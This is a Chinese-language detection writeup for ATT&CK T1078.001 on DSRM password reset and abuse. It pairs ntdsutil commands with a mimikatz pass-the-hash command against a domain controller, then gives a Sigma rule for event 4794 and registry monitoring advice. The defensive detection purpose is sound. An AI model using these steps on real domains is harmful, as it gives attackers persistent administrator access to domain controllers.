# T1078-001-win-DSRM密码重置

## 来自ATT&CK的描述

攻击者可能会使用凭据访问技术窃取特定用户或服务账号的凭据，或者在早起的侦察过程通过社会工程捕获凭据以获得首次访问权限。

攻击者可以使用三种账号：默认账号、本地账号和域账号。默认账号是操作系统的内置账号，例如Windows系统上的访客或管理员账号，或者其他类型系统、软件或设备上的默认提供商账号。本地账号是组织配置给用户、远程支持或服务的账号，或单个系统/服务的管理账号。域账号是AD-DS（活动目录域服务）管理的账号，其访问和权限在域内不同系统和服务之间配置。域账号可以涵盖用户、管理员和服务。

## 测试案例

目录还原模式账户

每一个域控制器都有一个本地管理员账户其实也就是所谓的目录服务还原模式（DSRM）账户。DSRM的密码是在DC安装的时候就需要设置，并且很少会被重置。修改DSRM密码最基本的方法是在DC上运行ntdsutil命令行工具。

在安装了KB961320补丁的Windows Server 2008以及之后发布的Windows Server中，开始支持在DC上使用指定的域帐户同步DSRM密码。但是这个同步操作是一次性的，也就是说你必须在每次更改了DSRM密码后进行一次密码同步。

如果一个攻击者可以得到运行在Windows Server 2008 R2或 Windows Server 2012 R2（DsrmAdminLogonBehavior的值为2）的域控的DSRM账户密码或者HASH值，那么DSRM账户就可以被用于“HASH传递攻击”方式。这就使得攻击者可以保持域控制器的管理员权限，即使所有的域用户和计算机密码被修改了。

## 检测日志

windows安全日志

## 测试复现

### 0x00 更改DSRM账号密码

执行以下命令(DC上)

```dos
NTDSUTIL
set dsrm password
reset password on server null
<PASSWORD>
Q
Q
```

实际测试结果：

```dos
C:\Users\Administrator>ntdsutil
ntdsutil: set dsrm password
重置 DSRM 管理员密码: reset password on server null
请键入 DS 还原模式 Administrator 帐户的密码: *********
请确认新密码: *********
密码设置成功。

重置 DSRM 管理员密码: Q
ntdsutil: Q
```

### 0x01 使用域帐户同步DSRM账户密码

使用域管理员帐户登录DC后，启动一个“取得管理员权限”的CMD，运行如下命令行：

```dos
NTDSUTIL
SET DSRM PASSWORD
SYNC FROM DOMAIN ACCOUNT <your user here>
Q
Q
```

### 0x02 使用DSRM作为活动目录的后门

有关DSRM密码的一个有意思的事情是这个DSRM账户实际上就是“Administrator”。这就意味着一旦攻击者有了DC的DSRM密码，就有可能使用这个账户通过网络作为一个本地管理员登录到DC上。

我们可以使用法国佬神器（mimikatz）来确认DSRM账号就是本地管理员帐户。首先，使用一个已知的密码创建一个AD用户（xiaomi），之后，使用这个域账户进行DSRM密码同步操作。

具体操作命令可以参考0x01命令

关于更多使用DSRM作为活动目录后门的用法可以参考Freebuf文中提到方法。

### 0x03 使用DSRM凭证的一种更为高级的方法

正如0x02所述，DSRM账户实际上是一个可用的本地管理员账户，并且可以通过网络验证并登录到DC中，当然，**要确保DsrmAdminLogonBehavior注册表键的值为 2**。另外，攻击者并不需要知道DSRM账户的真实密码，只需要知道这个账户的HASH值。这就意味着一旦攻击者有了DSRM账户的HASH值，就可以通过网络使用“HASH传递攻击”方式，并以一个管理员的身份访问DC。这个方法在Windows Server 2008 R2和Windows Server 2012 R2的域控中已经测试成功了。

使用法国佬神器（mimikatz）执行如下命令行：

```dos
Mimikatz “privilege::debug” “sekurlsa::pth /domain:xiaomi.org /user:administrator /ntlm:7c08d63a2f48f045971bc2236ed3f3ac” exit
```

注意的是：由于DSRM账户实际上是一个可用的本地管理员账户administrator，所以在此处，可以这么理解，攻击者知道DC本地账户administrator的NTML HASH，使用mimikatz进行HASH传递进行攻击，达到以DC本地账户administrator的密码进行登录访问DC。

## 测试留痕

windows 安全日志4794

## 检测规则/思路

### Sigma规则

```yml
title: 目录服务还原模式（DSRM）帐户上的密码更改
status: 稳定
description: 目录服务还原模式（DSRM）帐户是域控制器上的本地管理员帐户。攻击者可以更改密码以获得持久性。
references:
    - https://adsecurity.org/?p=1714
tags:
    - attack.persistence
    - attack.privilege_escalation
    - attack.t1098
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4794 #试图设置目录服务还原模式管理员密码
    condition: selection
falsepositives:
    - Initial installation of a domain controller
level: high
```

### 建议

1.监控与DSRM密码重置和使用相关的事件日志

  4794：试图设置目录服务还原模式管理员密码。

2.监控如下注册表位置的值，当值为 1 或 2时，应引起警示

```reg
HKLM\System\CurrentControlSet\Control\Lsa\DSRMAdminLogonBehavior
```

## 参考推荐

MITRE-ATT&CK-T1078-001

<https://attack.mitre.org/techniques/T1078/001/>

域控权限持久化之DSRM

<https://www.freebuf.com/articles/system/80968.html>

巧用DSRM密码同步将域控权限持久化

<https://www.uedbox.com/post/10269/>
